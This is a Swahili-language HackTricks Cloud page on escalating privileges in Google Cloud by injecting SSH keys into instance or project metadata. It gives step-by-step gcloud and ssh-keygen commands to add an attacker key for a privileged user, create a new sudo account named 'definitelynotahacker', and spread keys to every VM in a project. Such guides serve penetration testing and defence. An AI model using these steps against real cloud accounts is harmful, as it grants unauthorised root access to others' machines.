# GCP - Ongeza Metadata ya SSH ya Desturi

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalam wa juu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kubadilisha metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Kubadilisha metadata kwenye kifaa kinaweza kusababisha **hatari kubwa ya usalama ikiwa mshambuliaji atapata idhini inayohitajika**.

### **Kuingiza Vipindi vya SSH kwenye Metadata ya Desturi**

Kwenye GCP, **mifumo ya Linux** mara nyingi hutekeleza skripti kutoka kwa [Mazingira ya Mgeni wa Linux wa Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Sehemu muhimu ya hii ni [daemon ya akaunti](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), ambayo imeundwa kwa ajili ya **kuangalia mara kwa mara** kwenye kiishara cha metadata ya kifaa kwa **mabadiliko kwenye funguo za umma za SSH zilizoidhinishwa**.

Hivyo, ikiwa mshambuliaji anaweza kubadilisha metadata ya desturi, anaweza kufanya daemon ipate funguo mpya za umma, ambazo zitashughulikiwa na **kuingizwa kwenye mfumo wa ndani**. Funguo itaongezwa kwenye faili ya `~/.ssh/authorized_keys` ya **mtumiaji aliyopo au labda kuunda mtumiaji mpya mwenye `sudo` privileges**, kulingana na muundo wa funguo. Na mshambuliaji ataweza kudhoofisha mwenyeji.

### **Ongeza funguo ya SSH kwa mtumiaji aliye na mamlaka**

1. **Angalia Funguo za SSH Zilizopo kwenye Kifaa:**
- Tekeleza amri ya kuelezea kifaa na metadata yake ili kutambua funguo za SSH zilizopo. Sehemu inayofaa katika matokeo itakuwa chini ya `metadata`, kwa usahihi ufunguo wa `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- Tilia maanani muundo wa funguo za SSH: jina la mtumiaji linatangulia funguo, likitenganishwa na kikoloni.

2. **Andaa Faili ya Maandishi kwa Metadata ya Funguo ya SSH:**
- Hifadhi maelezo ya majina ya watumiaji na funguo zao za SSH zinazolingana kwenye faili ya maandishi iliyoitwa `meta.txt`. Hii ni muhimu kwa kuhifadhi funguo zilizopo wakati wa kuongeza mpya.

3. **Tengeneza Funguo Mpya ya SSH kwa Mtumiaji wa Lengo (`alice` kwa mfano huu):**
- Tumia amri ya `ssh-keygen` kutengeneza funguo mpya ya SSH, hakikisha kuwa uga wa maoni (`-C`) unalingana na jina la mtumiaji wa lengo.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Ongeza funguo ya umma mpya kwenye `meta.txt`, ikifanana na muundo uliopatikana kwenye metadata ya kifaa.

4. **Sasisha Metadata ya Funguo ya SSH ya Kifaa:**
- Tumia amri ya `gcloud compute instances add-metadata` kuomba metadata iliyosasishwa ya funguo za SSH kwa kifaa.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Fikia Kifaa Kwa Kutumia Funguo Mpya ya SSH:**
- Unganisha kifaa kwa SSH ukitumia funguo mpya, ukipata upatikanaji wa kabati katika muktadha wa mtumiaji wa lengo (`alice` kwa mfano huu).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Unda mtumiaji mpya mwenye mamlaka na ongeza funguo ya SSH**

Ikiwa hakuna mtumiaji wa kuvutia anapatikana, ni rahisi kuunda mpya ambaye atapewa mamlaka ya `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Vipuli vya SSH kwa kiwango cha mradi <a href="#sshing-around" id="sshing-around"></a>

Inawezekana kupanua ufikiaji wa SSH kwa Mashine za Virtual (VMs) nyingi katika mazingira ya wingu kwa **kuomba vipuli vya SSH kwa kiwango cha mradi**. Hatua hii inaruhusu ufikiaji wa SSH kwa kila kifaa ndani ya mradi ambao haujazuia wazi vipuli vya SSH kwa kiwango cha mradi. Hapa kuna mwongozo uliofupishwa:

1. **Tumia Vipuli vya SSH kwa Kiwango cha Mradi:**
- Tumia amri `gcloud compute project-info add-metadata` kuongeza vipuli vya SSH kutoka `meta.txt` kwenye metadata ya mradi. Hatua hii inahakikisha kuwa vipuli vya SSH vinatambuliwa kote kwenye VMs zote katika mradi, isipokuwa kama VM ina chaguo la "Block project-wide SSH keys" limezimwa.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH kuingia kwenye Vifaa Kwa Kutumia Vipuli vya Kiwango cha Mradi:**
- Kwa vipuli vya SSH kwa kiwango cha mradi mahali pake, unaweza kuingia kwa SSH kwenye kifaa chochote ndani ya mradi. Vifaa ambavyo havizuiliwi na vipuli vya SSH kwa kiwango cha mradi vitakubali kipuli cha SSH, kutoa ufikiaji.
- Njia moja moja ya kuingia kwa SSH kwenye kifaa ni kutumia amri `gcloud compute ssh [INSTANCE]`. Amri hii hutumia jina lako la sasa na vipuli vya SSH vilivyowekwa kwa kiwango cha mradi kujaribu ufikiaji.

# Marejeo
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
